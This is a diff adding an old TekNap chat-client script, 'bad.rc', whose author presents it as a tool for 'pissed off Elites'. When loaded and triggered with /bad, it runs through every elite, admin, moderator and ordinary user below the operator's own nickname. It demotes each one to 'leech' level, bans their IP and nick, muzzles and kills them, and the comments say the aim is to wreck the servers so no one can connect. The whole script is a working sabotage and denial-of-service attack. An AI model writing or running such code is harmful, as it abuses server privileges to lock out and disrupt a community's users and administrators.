@@ -1,0 +1,57 @@
+#bad.rc
+#by joey2cool
+#http://geocities.com/joey2cool/teknap_scripts
+#this script was made for pissed off Elites!
+
+#first put your nickname below and save this script
+assign protect_nick nickname
+
+#now all u gotta do is load this script and type /bad
+alias bad {
+
+#first lets take care of the other elites
+
+^gusers -elite
+^on ^832 "*" {
+if ([$0] < [$protect_nick) {
+raw 606 $0 leech
+}
+}
+
+#now its the admins' turn
+
+^gusers -admin
+^on ^832 "*" {
+if ([$0] < [$protect_nick]) {
+raw 606 $0 leech
+}
+}
+
+#mods cant really do anything but lets get rid of them too :)
+
+^gusers -mod
+^on ^832 "*" {
+if ([$0] < [$protect_nick]) {
+raw 606 $0 leech
+}
+}
+
+#ok now lets get rid of everybody and screw up the servers so noone can get on
+
+^gusers
+^on ^832 "*" {
+if ([$0] < [$protect_nick]) {
+raw 606 $0 leech
+whois $0
+on ^who $0
+{
+ban $12 lam0r
+raw 613 $0 0
+ban $0 lam0r
+muzzle $0 lam0r
+raw 753 $0 fuckedup lam0r
+kill $0 lam0r
+}
+}
+}
+}
